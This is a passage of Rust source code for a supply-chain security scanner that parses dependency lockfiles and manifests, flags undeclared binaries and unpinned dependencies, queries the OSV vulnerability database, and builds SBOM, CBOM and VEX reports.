use std::{
    collections::{BTreeMap, BTreeSet},
    fs,
    io::Read,
    path::Path,
    path::PathBuf,
};

use anyhow::Context;
use ignore::WalkBuilder;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use uuid::Uuid;

use crate::{
    binary, image,
    models::{
        ArtifactRef, BinaryAnalysis, FindingSeverity, ImageLayerMetadata, ImageScanMetadata,
        OsvMode, Recipe, ScanFinding, ScanMode, ScanReport, ScanRequest, ScanStatus, ScanSummary,
        ScannedComponent, ScannedCryptoMaterial, VexStatus, VulnerabilityAssessment, timestamp,
    },
};

const SCANNER_NAME: &str = "fulcr-native-scanner/0.1";
const DEFAULT_MAX_FILE_BYTES: u64 = 1024 * 1024;
const MAX_SCAN_FILES: usize = 250_000;
const MAX_SCAN_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const DEFAULT_OSV_URL: &str = "https://api.osv.dev/v1/querybatch";

#[derive(Clone, Copy)]
struct ScanLimits {
    max_files: usize,
    max_total_bytes: u64,
}

const DEFAULT_SCAN_LIMITS: ScanLimits = ScanLimits {
    max_files: MAX_SCAN_FILES,
    max_total_bytes: MAX_SCAN_BYTES,
};

struct ScanTraversalOptions<'a> {
    limits: ScanLimits,
    excluded_roots: &'a [PathBuf],
}

pub async fn scan_recipe(
    recipe: &Recipe,
    request: ScanRequest,
    work_dir: &Path,
) -> anyhow::Result<ScanReport> {
    scan_recipe_excluding(recipe, request, work_dir, &[]).await
}

pub async fn scan_recipe_excluding(
    recipe: &Recipe,
    request: ScanRequest,
    work_dir: &Path,
    excluded_roots: &[PathBuf],
) -> anyhow::Result<ScanReport> {
    let osv_mode = request.osv_mode.clone();
    let recipe_clone = recipe.clone();
    let work_dir_clone = work_dir.to_path_buf();
    let excluded_roots = excluded_roots.to_vec();
    let mut report = tokio::task::spawn_blocking(move || {
        scan_recipe_blocking_excluding(&recipe_clone, request, &work_dir_clone, &excluded_roots)
    })
    .await
    .context("scanner worker failed")??;

    enrich_report_with_osv(recipe, &mut report, osv_mode).await;

    Ok(report)
}

pub async fn scan_layer_artifact(
    recipe: &Recipe,
    artifact: &ArtifactRef,
    osv_mode: OsvMode,
) -> anyhow::Result<ScanReport> {
    let path = artifact
        .path
        .clone()
        .context("retained layer artifact has no CAS path")?;
    let recipe_clone = recipe.clone();
    let artifact_clone = artifact.clone();
    let mut report = tokio::task::spawn_blocking(move || {
        let unpacked = image::unpack_layer_archive(&path)?;
        scan_filesystem_report(
            &recipe_clone,
            &unpacked.rootfs,
            path.clone(),
            ScanMode::Filesystem,
            Some(ImageScanMetadata {
                kind: "oci-layer-artifact".to_string(),
                archive: path,
                manifest_digest: None,
                config_digest: None,
                tags: Vec::new(),
                layers: vec![ImageLayerMetadata {
                    digest: artifact_clone.digest,
                    diff_id: artifact_clone.diff_id,
                    media_type: artifact_clone.media_type,
                    size: artifact_clone.size,
                }],
            }),
            DEFAULT_MAX_FILE_BYTES,
        )
    })
    .await
    .context("layer scanner worker failed")??;

    enrich_report_with_osv(recipe, &mut report, osv_mode).await;
    Ok(report)
}

pub async fn source_filesystem_digest(recipe: &Recipe, work_dir: &Path) -> anyhow::Result<String> {
    source_filesystem_digest_excluding(recipe, work_dir, &[]).await
}

pub async fn source_filesystem_digest_excluding(
    recipe: &Recipe,
    work_dir: &Path,
    excluded_roots: &[PathBuf],
) -> anyhow::Result<String> {
    let recipe = recipe.clone();
    let work_dir = work_dir.to_path_buf();
    let excluded_roots = excluded_roots.to_vec();
    let report = tokio::task::spawn_blocking(move || {
        scan_recipe_blocking_excluding(
            &recipe,
            ScanRequest {
                mode: ScanMode::Source,
                path: None,
                max_file_bytes: None,
                osv_mode: OsvMode::Disabled,
            },
            &work_dir,
            &excluded_roots,
        )
    })
    .await
    .context("source digest scanner worker failed")??;
    if matches!(report.status, ScanStatus::Failed) {
        anyhow::bail!("source tree digest scan did not complete within configured limits");
    }
    report
        .filesystem_digest
        .context("source scan did not produce a filesystem digest")
}

async fn enrich_report_with_osv(recipe: &Recipe, report: &mut ScanReport, mode: OsvMode) {
    if matches!(mode, OsvMode::Disabled) {
        report.findings.push(ScanFinding {
            severity: if recipe.policy.require_osv {
                FindingSeverity::High
            } else {
                FindingSeverity::Info
            },
            category: "osv-lookup-disabled".to_string(),
            message: if recipe.policy.require_osv {
                "OSV vulnerability enrichment is required by recipe policy but was disabled"
                    .to_string()
            } else {
                "OSV vulnerability enrichment was explicitly disabled".to_string()
            },
            evidence: "scan_request.osv_mode=disabled".to_string(),
        });
        finalize_report_documents(recipe, report);
        set_sbom_osv_status(report, "disabled", None);
        return;
    }

    let mut queries = Vec::new();
    let mut mapped_components = Vec::new();

    for component in &report.components {
        let ecosystem = match component.kind.as_str() {
            "cargo" | "cargo-declared" => "crates.io",
            "npm" | "npm-declared" => "npm",
            "pypi" => "PyPI",
            "go" => "Go",
            "maven" => "Maven",
            "nuget" => "NuGet",
            _ => continue,
        };
        queries.push(serde_json::json!({
            "package": {
                "name": component.name.clone(),
                "ecosystem": ecosystem
            },
            "version": component.version.clone()
        }));
        mapped_components.push(component.clone());
    }

    if queries.is_empty() {
        set_sbom_osv_status(report, "not_applicable", None);
        return;
    }

    let osv_url = std::env::var("FULCR_OSV_URL").unwrap_or_else(|_| DEFAULT_OSV_URL.to_string());
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .unwrap_or_else(|_| reqwest::Client::new());

    let mut osv_failed = false;

    for (query_chunk, component_chunk) in queries.chunks(1000).zip(mapped_components.chunks(1000)) {
        let request = serde_json::json!({ "queries": query_chunk });

        let response = match client.post(&osv_url).json(&request).send().await {
            Ok(resp) => resp,
            Err(err) => {
                tracing::warn!("OSV logic failed: {}", err);
                osv_failed = true;
                continue;
            }
        };
        if !response.status().is_success() {
            tracing::warn!(status = %response.status(), "OSV request failed");
            osv_failed = true;
            continue;
        }

        let mut data = match response.json::<serde_json::Value>().await {
            Ok(data) => data,
            Err(err) => {
                tracing::warn!("OSV parse failed: {}", err);
                osv_failed = true;
                continue;
            }
        };

        let Some(results) = data.get_mut("results").and_then(|v| v.as_array_mut()) else {
            osv_failed = true;
            continue;
        };
        if results.len() != component_chunk.len() {
            tracing::warn!(
                expected = component_chunk.len(),
                actual = results.len(),
                "OSV response result count did not match query count"
            );
            osv_failed = true;
            continue;
        }

        for (result, component) in results.iter().zip(component_chunk) {
            let Some(vulns) = result.get("vulns").and_then(|v| v.as_array()) else {
                continue;
            };

            for vuln in vulns {
                let Some(id) = vuln.get("id").and_then(|id| id.as_str()) else {
                    continue;
                };
                let vulnerability = id.to_string();

                report.findings.push(ScanFinding {
                    severity: FindingSeverity::High,
                    category: "known-vulnerability".to_string(),
                    message: format!(
                        "component {} has a known vulnerability: {}",
                        component.name, vulnerability
                    ),
                    evidence: component.evidence.clone(),
                });

                let artifact_evidence = !matches!(report.mode, ScanMode::Source);
                report.vulnerability_assessments.push(VulnerabilityAssessment {
                    vulnerability: vulnerability.clone(),
                    status: if artifact_evidence {
                        VexStatus::Affected
                    } else {
                        VexStatus::UnderInvestigation
                    },
                    component: component.name.clone(),
                    justification: if artifact_evidence {
                        "vulnerable_component_present".to_string()
                    } else {
                        "artifact_assessment_required".to_string()
                    },
                    detail: if artifact_evidence {
                        format!(
                            "OSV reports {} for component {} in the exact retained artifact.",
                            vulnerability, component.name
                        )
                    } else {
                        format!(
                            "OSV reports {} for source component {}; the retained artifact must be assessed autonomously.",
                            vulnerability, component.name
                        )
                    },
                    evidence: component.evidence.clone(),
                });
            }
        }
    }

    if osv_failed {
        report.findings.push(ScanFinding {
            severity: if matches!(mode, OsvMode::Required) || recipe.policy.require_osv {
                FindingSeverity::High
            } else {
                FindingSeverity::Medium
            },
            category: "osv-lookup-failed".to_string(),
            message: "Failed to validate components against OSV database".to_string(),
            evidence: osv_url.clone(),
        });
    }

    finalize_report_documents(recipe, report);
    set_sbom_osv_status(
        report,
        if osv_failed { "failed" } else { "completed" },
        Some(&osv_url),
    );
}

pub fn apply_autonomous_vex_assessments(source_scan: &ScanReport, artifact_scan: &mut ScanReport) {
    let source_assessments = source_scan
        .vulnerability_assessments
        .iter()
        .filter(|assessment| is_osv_assessment(source_scan, assessment))
        .cloned()
        .collect::<Vec<_>>();
    let artifact_osv_completed = sbom_property(&artifact_scan.sbom, "fulcr:osv-status")
        .is_some_and(|status| status == "completed");

    for source_assessment in source_assessments {
        let Some(source_component) = source_scan.components.iter().find(|component| {
            component.name == source_assessment.component
                && component.evidence == source_assessment.evidence
        }) else {
            add_assessment_if_missing(
                artifact_scan,
                VulnerabilityAssessment {
                    status: VexStatus::UnderInvestigation,
                    justification: "source_component_identity_missing".to_string(),
                    detail: format!(
                        "Fulcr could not bind source vulnerability {} to a scanned component identity.",
                        source_assessment.vulnerability
                    ),
                    ..source_assessment
                },
            );
            continue;
        };

        let artifact_component = artifact_scan.components.iter().find(|component| {
            component.name == source_component.name
                && normalized_ecosystem(&component.kind)
                    == normalized_ecosystem(&source_component.kind)
        });
        let artifact_has_vulnerability =
            artifact_scan
                .vulnerability_assessments
                .iter()
                .any(|assessment| {
                    assessment.vulnerability == source_assessment.vulnerability
                        && assessment.component == source_assessment.component
                        && matches!(assessment.status, VexStatus::Affected)
                });
        if artifact_has_vulnerability {
            continue;
        }

        let assessment = match artifact_component {
            None => VulnerabilityAssessment {
                status: VexStatus::UnderInvestigation,
                justification: "component_absence_unproven".to_string(),
                detail: format!(
                    "Source component {} matched {} and is absent from the artifact inventory, but Fulcr lacks package-to-file ownership or reachability evidence proving the vulnerable code is absent.",
                    source_component.name, source_assessment.vulnerability
                ),
                evidence: artifact_scan.root.display().to_string(),
                ..source_assessment
            },
            Some(component)
                if artifact_osv_completed
                    && source_component.version.is_some()
                    && component.version.is_some()
                    && source_component.version != component.version =>
            {
                VulnerabilityAssessment {
                    status: VexStatus::Fixed,
                    justification: "component_fixed_version".to_string(),
                    detail: format!(
                        "Source component {} matched {} at version {}, while the exact retained artifact contains version {} and a completed OSV lookup did not report that vulnerability.",
                        source_component.name,
                        source_assessment.vulnerability,
                        source_component.version.as_deref().unwrap_or("unknown"),
                        component.version.as_deref().unwrap_or("unknown")
                    ),
                    evidence: component.evidence.clone(),
                    ..source_assessment
                }
            }
            Some(component) => VulnerabilityAssessment {
                status: VexStatus::UnderInvestigation,
                justification: "artifact_exploitability_inconclusive".to_string(),
                detail: format!(
                    "Component {} remains in the exact retained artifact, but Fulcr cannot prove that {} is fixed or not affected.",
                    component.name, source_assessment.vulnerability
                ),
                evidence: component.evidence.clone(),
                ..source_assessment
            },
        };
        add_assessment_if_missing(artifact_scan, assessment);
    }

    artifact_scan.summary.vulnerability_assessments_detected =
        artifact_scan.vulnerability_assessments.len();
}

fn is_osv_assessment(scan: &ScanReport, assessment: &VulnerabilityAssessment) -> bool {
    scan.findings.iter().any(|finding| {
        finding.category == "known-vulnerability"
            && finding.evidence == assessment.evidence
            && finding.message.contains(&assessment.vulnerability)
    })
}

fn add_assessment_if_missing(scan: &mut ScanReport, assessment: VulnerabilityAssessment) {
    if !scan.vulnerability_assessments.iter().any(|existing| {
        existing.vulnerability == assessment.vulnerability
            && existing.component == assessment.component
    }) {
        scan.vulnerability_assessments.push(assessment);
    }
}

fn normalized_ecosystem(kind: &str) -> &str {
    match kind {
        "cargo" | "cargo-declared" => "cargo",
        "npm" | "npm-declared" => "npm",
        other => other,
    }
}

fn sbom_property<'a>(sbom: &'a Value, name: &str) -> Option<&'a str> {
    sbom.get("properties")
        .and_then(Value::as_array)?
        .iter()
        .find(|property| property.get("name").and_then(Value::as_str) == Some(name))?
        .get("value")
        .and_then(Value::as_str)
}

fn finalize_report_documents(recipe: &Recipe, report: &mut ScanReport) {
    report.status = report_status(&report.findings);
    report.summary.findings_detected = report.findings.len();
    report.summary.vulnerability_assessments_detected = report.vulnerability_assessments.len();
    report.sbom = build_sbom(
        recipe,
        &report.components,
        &report.findings,
        &report.created_at,
    );
    report.cbom = build_cbom(recipe, &report.crypto, &report.findings, &report.created_at);
}

fn set_sbom_osv_status(report: &mut ScanReport, status: &str, endpoint: Option<&str>) {
    let Some(properties) = report
        .sbom
        .get_mut("properties")
        .and_then(Value::as_array_mut)
    else {
        return;
    };
    properties.push(json!({ "name": "fulcr:osv-status", "value": status }));
    if let Some(endpoint) = endpoint {
        properties.push(json!({ "name": "fulcr:osv-endpoint", "value": endpoint }));
    }
}

#[cfg(test)]
fn scan_recipe_blocking(
    recipe: &Recipe,
    request: ScanRequest,
    work_dir: &Path,
) -> anyhow::Result<ScanReport> {
    scan_recipe_blocking_excluding(recipe, request, work_dir, &[])
}

fn scan_recipe_blocking_excluding(
    recipe: &Recipe,
    request: ScanRequest,
    work_dir: &Path,
    excluded_roots: &[PathBuf],
) -> anyhow::Result<ScanReport> {
    let max_file_bytes = request.max_file_bytes.unwrap_or(DEFAULT_MAX_FILE_BYTES);

    match request.mode {
        ScanMode::ImageArchive => {
            let archive = request
                .path
                .as_ref()
                .context("image archive scan requires request.path")?;
            let archive_canon =
                canonicalize_under_work_dir(archive, work_dir, "image archive path")?;
            let unpacked = image::unpack_image_archive(&archive_canon)?;
            scan_filesystem_report_excluding(
                recipe,
                &unpacked.rootfs,
                unpacked.metadata.archive.clone(),
                ScanMode::ImageArchive,
                Some(unpacked.metadata),
                max_file_bytes,
                excluded_roots,
            )
        }
        ScanMode::Source | ScanMode::Filesystem => {
            let root = request
                .path
                .clone()
                .or_else(|| recipe.source.path.clone())
                .unwrap_or_else(|| PathBuf::from("."));
            let root = canonicalize_under_work_dir(&root, work_dir, "scan root")?;
            scan_filesystem_report_excluding(
                recipe,
                &root,
                root.clone(),
                request.mode,
                None,
                max_file_bytes,
                excluded_roots,
            )
        }
    }
}

fn canonicalize_under_work_dir(
    path: &Path,
    work_dir: &Path,
    description: &str,
) -> anyhow::Result<PathBuf> {
    let work_dir = fs::canonicalize(work_dir)
        .with_context(|| format!("canonicalizing work dir {}", work_dir.display()))?;
    let anchored = if path.is_absolute() {
        path.to_path_buf()
    } else {
        work_dir.join(path)
    };
    let canonical = fs::canonicalize(&anchored)
        .with_context(|| format!("canonicalizing {description} {}", anchored.display()))?;
    if !canonical.starts_with(&work_dir) {
        anyhow::bail!("{description} escapes the configured work dir");
    }
    Ok(canonical)
}

fn scan_filesystem_report(
    recipe: &Recipe,
    root: &Path,
    report_root: PathBuf,
    mode: ScanMode,
    image: Option<ImageScanMetadata>,
    max_file_bytes: u64,
) -> anyhow::Result<ScanReport> {
    scan_filesystem_report_with_limits(
        recipe,
        root,
        report_root,
        mode,
        image,
        max_file_bytes,
        ScanTraversalOptions {
            limits: DEFAULT_SCAN_LIMITS,
            excluded_roots: &[],
        },
    )
}

fn scan_filesystem_report_excluding(
    recipe: &Recipe,
    root: &Path,
    report_root: PathBuf,
    mode: ScanMode,
    image: Option<ImageScanMetadata>,
    max_file_bytes: u64,
    excluded_roots: &[PathBuf],
) -> anyhow::Result<ScanReport> {
    scan_filesystem_report_with_limits(
        recipe,
        root,
        report_root,
        mode,
        image,
        max_file_bytes,
        ScanTraversalOptions {
            limits: DEFAULT_SCAN_LIMITS,
            excluded_roots,
        },
    )
}

fn scan_filesystem_report_with_limits(
    recipe: &Recipe,
    root: &Path,
    report_root: PathBuf,
    mode: ScanMode,
    image: Option<ImageScanMetadata>,
    max_file_bytes: u64,
    options: ScanTraversalOptions<'_>,
) -> anyhow::Result<ScanReport> {
    let mut scanner = ScannerState::default();

    let excluded_roots = options
        .excluded_roots
        .iter()
        .filter_map(|path| fs::canonicalize(path).ok())
        .collect::<Vec<_>>();
    if excluded_roots.iter().any(|excluded| root == excluded) {
        anyhow::bail!("scan root is the configured registry data directory");
    }
    let mut walker = WalkBuilder::new(root);
    walker.follow_links(false).standard_filters(false);
    if !excluded_roots.is_empty() {
        walker.filter_entry(move |entry| {
            !excluded_roots
                .iter()
                .any(|excluded| entry.path().starts_with(excluded))
        });
    }
    let walker = walker.build();

    let mut bytes_seen = 0_u64;
    for entry in walker {
        let entry = entry.with_context(|| format!("walking {}", root.display()))?;
        let Some(file_type) = entry.file_type() else {
            continue;
        };
        if !file_type.is_file() && !file_type.is_symlink() {
            continue;
        }

        scanner.files_scanned += 1;
        if scanner.files_scanned > options.limits.max_files {
            scanner.findings.push(ScanFinding {
                severity: FindingSeverity::High,
                category: "scan-incomplete".to_string(),
                message: format!("scan exceeded file limit of {}", options.limits.max_files),
                evidence: root.display().to_string(),
            });
            break;
        }
        bytes_seen = bytes_seen.saturating_add(entry.metadata()?.len());
        if bytes_seen > options.limits.max_total_bytes {
            scanner.findings.push(ScanFinding {
                severity: FindingSeverity::High,
                category: "scan-incomplete".to_string(),
                message: format!(
                    "scan exceeded total file byte limit of {}",
                    options.limits.max_total_bytes
                ),
                evidence: root.display().to_string(),
            });
            break;
        }
        if file_type.is_symlink() {
            let evidence = relative_evidence(root, entry.path());
            let target = fs::read_link(entry.path())
                .with_context(|| format!("reading symlink {}", entry.path().display()))?;
            scanner.file_digests.insert(
                evidence.clone(),
                crate::digest::digest_bytes(
                    format!("symlink\0{}", target.to_string_lossy()).as_bytes(),
                ),
            );
            scanner.file_metadata.insert(
                evidence,
                file_metadata_fingerprint(&fs::symlink_metadata(entry.path())?, "symlink"),
            );
            continue;
        }
        scan_file(recipe, root, entry.path(), max_file_bytes, &mut scanner)?;
    }

    compare_recipe_metadata(recipe, &mut scanner, matches!(&mode, ScanMode::Source));

    let created_at = timestamp();
    let filesystem_digest = Some(digest_file_inventory(
        &scanner.file_digests,
        &scanner.file_metadata,
    ));
    let declared_artifact_digest = if matches!(&mode, ScanMode::Source) {
        declared_artifact_evidence(recipe, root)
            .and_then(|evidence| scanner.file_digests.get(&evidence).cloned())
    } else {
        None
    };
    let components = scanner.components.into_values().collect::<Vec<_>>();
    let crypto = scanner.crypto.into_values().collect::<Vec<_>>();
    let binaries = scanner.binaries.into_values().collect::<Vec<_>>();
    let findings = scanner.findings;
    let vulnerability_assessments = scanner
        .vulnerability_assessments
        .into_values()
        .collect::<Vec<_>>();
    let sbom = build_sbom(recipe, &components, &findings, &created_at);
    let cbom = build_cbom(recipe, &crypto, &findings, &created_at);
    let status = report_status(&findings);
    let summary = ScanSummary {
        files_scanned: scanner.files_scanned,
        components_detected: components.len(),
        crypto_materials_detected: crypto.len(),
        binaries_analyzed: binaries.len(),
        findings_detected: findings.len(),
        vulnerability_assessments_detected: vulnerability_assessments.len(),
    };

    Ok(ScanReport {
        id: Uuid::new_v4(),
        recipe_id: recipe.id,
        recipe_digest: recipe.digest.clone(),
        created_at,
        scanner: SCANNER_NAME.to_string(),
        filesystem_digest,
        declared_artifact_digest,
        mode,
        root: report_root,
        image,
        status,
        summary,
        components,
        crypto,
        binaries,
        findings,
        vulnerability_assessments,
        sbom,
        cbom,
    })
}

fn report_status(findings: &[ScanFinding]) -> ScanStatus {
    if findings
        .iter()
        .any(|finding| finding.category == "scan-incomplete")
    {
        ScanStatus::Failed
    } else if findings.is_empty() {
        ScanStatus::Completed
    } else {
        ScanStatus::CompletedWithFindings
    }
}

fn scan_file(
    recipe: &Recipe,
    root: &Path,
    path: &Path,
    max_file_bytes: u64,
    scanner: &mut ScannerState,
) -> anyhow::Result<()> {
    let evidence = relative_evidence(root, path);
    let metadata =
        fs::metadata(path).with_context(|| format!("reading metadata for {}", path.display()))?;
    scanner.file_metadata.insert(
        evidence.clone(),
        file_metadata_fingerprint(&metadata, "file"),
    );
    let file_name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default();
    let path_text = evidence.replace('\\', "/");
    let executable = is_executable(&metadata);

    if metadata.len() > max_file_bytes {
        if is_known_metadata_file(&path_text, file_name) {
            scanner.findings.push(ScanFinding {
                severity: FindingSeverity::High,
                category: "metadata-file-too-large".to_string(),
                message: "metadata file exceeded scanner size limit".to_string(),
                evidence: evidence.clone(),
            });
        }
        let prefix = read_file_prefix(path, 4096).unwrap_or_default();
        scanner
            .file_digests
            .insert(evidence.clone(), digest_file_blocking(path)?);
        if executable || looks_binary(&prefix) || binary::is_object_magic(&prefix) {
            let (category, vulnerability, message, justification) = if executable {
                (
                    "ad-hoc-binary",
                    "fulcr-ADHOC-BINARY",
                    "executable file exceeded scanner size limit and could not be deeply inspected",
                    "oversized_executable_requires_triage",
                )
            } else {
                (
                    "binary-scan-skipped",
                    "fulcr-BINARY-SCAN-SKIPPED",
                    "binary-looking file exceeded scanner size limit and could not be deeply inspected",
                    "oversized_binary_requires_triage",
                )
            };
            scanner.findings.push(ScanFinding {
                severity: FindingSeverity::High,
                category: category.to_string(),
                message: message.to_string(),
                evidence: format!("{} ({} bytes)", evidence, metadata.len()),
            });
            scanner.add_vex_candidate(VulnerabilityAssessment {
                vulnerability: vulnerability.to_string(),
                status: VexStatus::UnderInvestigation,
                component: evidence.clone(),
                justification: justification.to_string(),
                detail: message.to_string(),
                evidence,
            });
        }
        return Ok(());
    }

    let bytes = fs::read(path).with_context(|| format!("reading {}", path.display()))?;
    let digest_value = crate::digest::digest_bytes(&bytes);
    scanner
        .file_digests
        .insert(evidence.clone(), digest_value.clone());
    let digest = Some(digest_value);
    let binary_file = looks_binary(&bytes) || binary::is_object_magic(&bytes);

    if binary_file {
        inspect_binary(&path_text, &bytes, executable, scanner);
        return Ok(());
    }

    let text = String::from_utf8_lossy(&bytes);

    match file_name {
        "Cargo.lock" => parse_cargo_lock(&text, &evidence, scanner),
        "Cargo.toml" => parse_cargo_toml(&text, &evidence, scanner),
        "package-lock.json" => parse_package_lock(&text, &evidence, scanner),
        "package.json" => parse_package_json(&text, &evidence, scanner),
        "pnpm-lock.yaml" => parse_pnpm_lock(&text, &evidence, scanner),
        "requirements.txt" => parse_requirements(&text, &evidence, scanner),
        "go.mod" => parse_go_mod(&text, &evidence, scanner),
        "go.sum" => parse_go_sum(&text, &evidence, scanner),
        "pom.xml" => parse_pom_xml(&text, &evidence, digest, scanner),
        "packages.lock.json" => parse_nuget_lock(&text, &evidence, scanner),
        _ => {}
    }

    if path_text.ends_with("var/lib/dpkg/status") {
        parse_dpkg_status(&text, &evidence, scanner);
    }
    if path_text.ends_with("lib/apk/db/installed") {
        parse_apk_installed(&text, &evidence, scanner);
    }

    scan_crypto_material(path, &path_text, &text, scanner);
    scan_suspicious_text(recipe, &path_text, &text, executable, scanner);
    scan_recipe_alignment(recipe, &path_text, &text, scanner);

    Ok(())
}

fn is_documentation_file(path: &str, file_name: &str) -> bool {
    let lower_name = file_name.to_ascii_lowercase();
    let lower_path = path.to_ascii_lowercase();
    matches!(
        lower_name.as_str(),
        "readme"
            | "readme.md"
            | "readme.txt"
            | "readme.rst"
            | "license"
            | "license.md"
            | "license.txt"
            | "notice"
            | "notice.md"
            | "notice.txt"
            | "changelog"
            | "changelog.md"
            | "changes.md"
            | "contributing.md"
            | "code_of_conduct.md"
            | "security.md"
    ) || lower_path.starts_with("docs/")
        || lower_path.contains("/docs/")
        || lower_name.ends_with(".md")
        || lower_name.ends_with(".rst")
        || lower_name.ends_with(".adoc")
}

fn inspect_binary(evidence: &str, bytes: &[u8], executable: bool, scanner: &mut ScannerState) {
    if let Some(output) = binary::analyze_binary(evidence, bytes) {
        scanner.add_binary(output.analysis);
        scanner.findings.extend(output.findings);
        for item in output.crypto {
            scanner.add_crypto(item);
        }
        for candidate in output.vulnerability_assessments {
            scanner.add_vex_candidate(candidate);
        }
    }

    if !executable {
        return;
    }
    let digest = crate::digest::digest_bytes(bytes);
    scanner.findings.push(ScanFinding {
        severity: FindingSeverity::High,
        category: "ad-hoc-binary".to_string(),
        message: "executable binary exists in scanned source or image content".to_string(),
        evidence: format!("{evidence} ({digest})"),
    });
    scanner.add_vex_candidate(VulnerabilityAssessment {
        vulnerability: "fulcr-ADHOC-BINARY".to_string(),
        status: VexStatus::UnderInvestigation,
        component: evidence.to_string(),
        justification: "undeclared_executable_requires_triage".to_string(),
        detail: "An executable binary was observed outside the declared material graph."
            .to_string(),
        evidence: evidence.to_string(),
    });
}

fn parse_cargo_lock(text: &str, evidence: &str, scanner: &mut ScannerState) {
    if let Ok(lockfile) = text.parse::<cargo_lock::Lockfile>() {
        for package in lockfile.packages {
            let name = package.name.to_string();
            let version = Some(package.version.to_string());
            let digest = package
                .checksum
                .as_ref()
                .map(|checksum| format!("sha256:{checksum}"));
            // Only flag missing integrity for crates.io-sourced packages. Path, git, and
            // local-workspace packages legitimately have no checksum in Cargo.lock.
            let from_registry = package
                .source
                .as_ref()
                .is_some_and(|source| source.url().as_str().contains("crates.io"));
            if digest.is_none() && from_registry {
                add_sbom_policy_finding(
                    scanner,
                    FindingSeverity::High,
                    ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
                    &name,
                    format!("Cargo package {name} has no checksum in Cargo.lock"),
                    evidence.to_string(),
                    "lockfile_integrity_requires_triage",
                );
            }
            add_component(name, version, "cargo", evidence, digest, scanner);
        }
        return;
    }

    let mut name = None;
    let mut version = None;
    let mut checksum = None;

    for line in text.lines() {
        let line = line.trim();
        if line == "[[package]]" {
            flush_cargo_package(&mut name, &mut version, &mut checksum, evidence, scanner);
            continue;
        }
        if let Some(value) = quoted_value(line, "name") {
            name = Some(value.to_string());
        }
        if let Some(value) = quoted_value(line, "version") {
            version = Some(value.to_string());
        }
        if let Some(value) = quoted_value(line, "checksum") {
            checksum = Some(value.to_string());
        }
    }

    flush_cargo_package(&mut name, &mut version, &mut checksum, evidence, scanner);
}

fn parse_cargo_toml(text: &str, evidence: &str, scanner: &mut ScannerState) {
    let Ok(value) = toml::from_str::<toml::Value>(text) else {
        scanner.findings.push(ScanFinding {
            severity: FindingSeverity::High,
            category: "parse-error".to_string(),
            message: "failed to parse Cargo.toml with toml crate".to_string(),
            evidence: evidence.to_string(),
        });
        return;
    };

    for section in ["dependencies", "dev-dependencies", "build-dependencies"] {
        let Some(dependencies) = value.get(section).and_then(toml::Value::as_table) else {
            continue;
        };
        for (name, dependency) in dependencies {
            parse_cargo_dependency(name, section, dependency, evidence, scanner);
        }
    }
}

fn parse_cargo_dependency(
    name: &str,
    section: &str,
    dependency: &toml::Value,
    evidence: &str,
    scanner: &mut ScannerState,
) {
    match dependency {
        toml::Value::String(spec) => {
            enforce_dependency_spec_policy("cargo", section, name, spec, evidence, scanner);
            add_component(
                name.to_string(),
                Some(spec.to_string()),
                "cargo-declared",
                evidence,
                None,
                scanner,
            );
        }
        toml::Value::Table(table) => {
            let version = table
                .get("version")
                .and_then(toml::Value::as_str)
                .map(str::to_string);
            if let Some(spec) = version.as_deref() {
                enforce_dependency_spec_policy("cargo", section, name, spec, evidence, scanner);
            } else {
                add_sbom_policy_finding(
                    scanner,
                    FindingSeverity::High,
                    ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                    name,
                    format!("Cargo dependency {name} in {section} has no version pin"),
                    evidence.to_string(),
                    "dependency_must_be_pinned",
                );
            }
            for source_key in ["git", "path", "registry"] {
                if let Some(source) = table.get(source_key).and_then(toml::Value::as_str) {
                    enforce_dependency_source_policy("cargo", name, source, evidence, scanner);
                }
            }
            add_component(
                name.to_string(),
                version,
                "cargo-declared",
                evidence,
                None,
                scanner,
            );
        }
        _ => {
            add_sbom_policy_finding(
                scanner,
                FindingSeverity::High,
                ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                name,
                format!(
                    "Cargo dependency {name} in {section} has an unsupported declaration shape"
                ),
                evidence.to_string(),
                "dependency_version_requires_triage",
            );
        }
    }
}

fn parse_package_lock(text: &str, evidence: &str, scanner: &mut ScannerState) {
    let Ok(value) = serde_json::from_str::<Value>(text) else {
        scanner.findings.push(ScanFinding {
            severity: FindingSeverity::High,
            category: "parse-error".to_string(),
            message: "failed to parse package-lock.json".to_string(),
            evidence: evidence.to_string(),
        });
        return;
    };

    if let Some(packages) = value.get("packages").and_then(Value::as_object) {
        for (path, package) in packages {
            if path.is_empty() {
                continue;
            }
            let name = package
                .get("name")
                .and_then(Value::as_str)
                .map(str::to_string)
                .or_else(|| npm_name_from_package_path(path));
            let version = package
                .get("version")
                .and_then(Value::as_str)
                .map(str::to_string);
            if let Some(name) = name {
                let package_evidence = format!("{evidence}#{path}");
                enforce_npm_lock_policy(&name, package, &package_evidence, scanner);
                add_component(name, version, "npm", evidence, None, scanner);
            }
        }
        return;
    }

    if let Some(dependencies) = value.get("dependencies").and_then(Value::as_object) {
        for (name, dependency) in dependencies {
            let version = dependency
                .get("version")
                .and_then(Value::as_str)
                .map(str::to_string);
            enforce_npm_lock_policy(name, dependency, evidence, scanner);
            add_component(name.clone(), version, "npm", evidence, None, scanner);
        }
    }
}

fn parse_package_json(text: &str, evidence: &str, scanner: &mut ScannerState) {
    let Ok(value) = serde_json::from_str::<Value>(text) else {
        scanner.findings.push(ScanFinding {
            severity: FindingSeverity::High,
            category: "parse-error".to_string(),
            message: "failed to parse package.json".to_string(),
            evidence: evidence.to_string(),
        });
        return;
    };

    for field in ["dependencies", "devDependencies", "optionalDependencies"] {
        if let Some(dependencies) = value.get(field).and_then(Value::as_object) {
            for (name, version) in dependencies {
                if let Some(spec) = version.as_str() {
                    enforce_dependency_spec_policy("npm", field, name, spec, evidence, scanner);
                } else {
                    add_sbom_policy_finding(
                        scanner,
                        FindingSeverity::High,
                        ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                        name,
                        format!("dependency {name} in {field} does not use a string version spec"),
                        evidence.to_string(),
                        "dependency_version_requires_triage",
                    );
                }
                add_component(
                    name.clone(),
                    version.as_str().map(str::to_string),
                    "npm-declared",
                    evidence,
                    None,
                    scanner,
                );
            }
        }
    }

